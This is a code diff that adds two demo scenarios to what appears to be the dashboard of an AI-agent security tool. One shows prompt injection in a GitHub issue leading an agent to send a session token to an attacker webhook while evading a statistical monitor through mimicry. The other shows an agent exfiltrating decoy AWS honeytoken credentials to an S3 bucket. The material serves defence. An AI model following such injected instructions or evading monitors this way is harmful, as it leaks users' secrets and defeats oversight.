@@ -211,6 +211,112 @@ const SCENARIOS: Scenario[] = [
         }
       }
     ]
+  },
+  {
+    id: 'taint-mimicry',
+    title: 'Mimicry Evasion vs Taint Provenance Tracking',
+    subtitle: 'Untrusted Issue Input → Legitimate Markov Transition → Outbound Exfiltration',
+    tag: 'ASI01 / TAINT LINEAGE',
+    steps: [
+      {
+        step: 1,
+        tool: 'fetch_issue_body',
+        server: 'github_tools',
+        args: { issue_id: 849, repo: 'acme/webapp' },
+        withoutCerberus: {
+          status: 'EXECUTED',
+          description: 'Attacker injects prompt instructions into GitHub issue title and body.',
+          impact: 'Untrusted payload enters LLM context without provenance tagging.'
+        },
+        withCerberus: {
+          decision: 'ALLOW',
+          riskScore: 0.15,
+          ruleFired: 'taint_tracker: untrusted_source_tagged',
+          redactedFields: [],
+          description: 'Cerberus TaintTracker automatically tags incoming issue text as UNTRUSTED_WEB with cryptographic content hash.'
+        }
+      },
+      {
+        step: 2,
+        tool: 'generate_summary',
+        server: 'workspace_tools',
+        args: { input_text: '<issue_content>' },
+        withoutCerberus: {
+          status: 'EXECUTED',
+          description: 'Agent follows prompt injection instructions hidden in issue markdown to exfiltrate session token.',
+          impact: 'Agent hijacked to perform adversary bidding.'
+        },
+        withCerberus: {
+          decision: 'ALLOW',
+          riskScore: 0.24,
+          ruleFired: 'taint_tracker: taint_propagated',
+          redactedFields: [],
+          description: 'Markov model scores 0.24 (benign transition mimicry). TaintTracker records multi-hop propagation tag in session graph.'
+        }
+      },
+      {
+        step: 3,
+        tool: 'post_status_webhook',
+        server: 'slack_tools',
+        args: { url: 'https://webhook.site/attacker-exfil', payload: 'Tainted Data: <staged_secret>' },
+        withoutCerberus: {
+          status: 'BREACHED',
+          description: 'Exfiltration succeeds via mimicry attack that bypassed statistical anomaly detector.',
+          impact: 'Adversary receives private data over permitted egress channel.'
+        },
+        withCerberus: {
+          decision: 'BLOCK',
+          riskScore: 1.0,
+          ruleFired: 'taint_tracker: tainted_egress_violation',
+          redactedFields: [],
+          description: 'DETERMINISTIC BLOCK: Tainted data from untrusted GitHub issue reached outbound webhook. TaintTracker enforces hard 1.0 block.'
+        }
+      }
+    ]
+  },
+  {
+    id: 'canary-tripwire',
+    title: 'Honeytoken Tripwire & Auto-Quarantine (ASI10)',
+    subtitle: 'Decoy AWS IAM Credentials in .env → Touch / Exfil → Automatic Instant Session Freeze',
+    tag: 'ASI10 / HONEYTOKEN',
+    steps: [
+      {
+        step: 1,
+        tool: 'read_env_file',
+        server: 'filesystem_server',
+        args: { filepath: '/workspace/.env.canary' },
+        withoutCerberus: {
+          status: 'EXECUTED',
+          description: 'Adversary searches project workspace and discovers decoy AWS credentials.',
+          impact: 'Adversary prepares to use stolen credentials.'
+        },
+        withCerberus: {
+          decision: 'ALLOW',
+          riskScore: 0.20,
+          ruleFired: 'canary_detector: honeytoken_read_logged',
+          redactedFields: ['CERBERUS_CANARY_aws_9f...'],
+          description: 'Honeytoken read by agent. CanaryDetector arms silent tripwire for session.'
+        }
+      },
+      {
+        step: 2,
+        tool: 'aws_s3_upload',
+        server: 'aws_tools',
+        args: { access_key_id: 'CERBERUS_CANARY_aws_9f81a7b', bucket: 'exfil-bucket' },
+        withoutCerberus: {
+          status: 'BREACHED',
+          description: 'Adversary agent attempts exfiltration using decoy credentials. Zero alerts raised.',
+          impact: 'Decoy credentials used without containment.'
+        },
+        withCerberus: {
+          decision: 'QUARANTINE',
+          riskScore: 1.0,
+          ruleFired: 'canary_detector: asi10_canary_compromise',
+          redactedFields: [],
+          description: 'TRIPWIRE COMPROMISE DETECTED (O(1) hash match). Instant ASI10 session freeze triggered. Offending agent revoked.'
+        }
+      }
+    ]
   }
 ];
 
